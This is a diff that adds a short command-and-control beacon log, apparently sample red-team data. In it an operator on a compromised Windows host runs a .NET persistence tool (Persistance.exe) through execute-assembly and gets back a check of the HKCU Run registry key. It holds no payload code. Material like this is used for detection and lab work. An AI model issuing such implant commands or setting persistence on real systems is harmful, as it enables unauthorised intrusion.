@@ -1,0 +1,12 @@
+10/23 18:51:22 UTC [metadata] 192.168.3.108 <- 192.168.3.108; computer: COMPUTER001; user: allison_powell *; process: update.exe; pid: 5788; os: Windows; version: 6.2; build: 9200; beacon arch: x64 (x64)
+10/23 18:52:13 UTC [input] <analyst01> execute-assembly /home/analyst01/payloads/Persistance.exe -c
+10/23 18:52:13 UTC [task] <T1093> Tasked beacon to run .NET program: Persistance.exe -c
+10/23 18:53:13 UTC [checkin] host called home, sent: 125507 bytes
+10/23 18:53:14 UTC [output]
+received output:
+
+Registry HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run Values:
+
+Persistance not found
+
+
